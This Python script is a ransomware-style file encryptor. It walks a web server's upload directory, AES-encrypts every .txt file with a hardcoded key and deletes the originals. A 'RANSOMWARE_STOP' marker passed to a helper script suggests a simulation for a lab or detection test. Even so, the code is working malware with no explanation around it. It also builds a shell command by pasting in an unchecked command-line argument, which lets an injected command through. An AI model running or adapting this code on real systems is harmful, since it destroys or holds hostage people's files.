#!/usr/bin/python3

from Crypto import Random
from Crypto.Cipher import AES
import os
import os.path
from os import listdir
from os.path import isfile, join
import time
import sys

class Encryptor:
    def __init__(self, key):
        self.key = key

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

    def encrypt_file(self, file_name):
        with open(file_name, 'rb') as fo:
            plaintext = fo.read()
        enc = self.encrypt(plaintext, self.key)
        with open(file_name + ".enc", 'wb') as fo:
            fo.write(enc)
        os.remove(file_name)

    def decrypt(self, ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def decrypt_file(self, file_name):
        if (".enc" in file_name):
            with open(file_name, 'rb') as fo:
                ciphertext = fo.read()
            dec = self.decrypt(ciphertext, self.key)
            with open(file_name[:-4], 'wb') as fo:
                fo.write(dec)
            os.remove(file_name)

    def getAllFiles(self):
        # dir_path = os.path.dirname(os.path.realpath(__file__))
        dir_path = os.path.dirname("/var/www/html/upload/files/")
        dirs = []
        for dirName, subdirList, fileList in os.walk(dir_path):
            for fname in fileList:
                if ((fname != 'index.php') and (".txt" in fname)):
                    dirs.append(dirName + "/" + fname)
        return dirs

    def encrypt_all_files(self):
        dirs = self.getAllFiles()
        for file_name in dirs:
             self.encrypt_file(file_name)

key = b'[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e'
enc = Encryptor(key)

if os.path.isfile('./data.txt.enc'):
    while True:
        password = str(sys.argv[1])
        enc.decrypt_file("./data.txt.enc")
        p = ''
        with open("./data.txt", "r") as f:
            p = f.readlines()
        if p[0] == password:
            enc.encrypt_file("./data.txt")
            break

    enc.encrypt_all_files()
    cmd = "./psutil_usages.py " + str(sys.argv[2]) + " " + str(int(time.time())) + " RANSOMWARE_STOP"
    os.system(cmd)

else:
    password = str(sys.argv[1])
    f = open("./data.txt", "w+")
    f.write(password)
    f.close()
    enc.encrypt_file("data.txt")
    print("Please restart the program to complete the setup")
    time.sleep(15)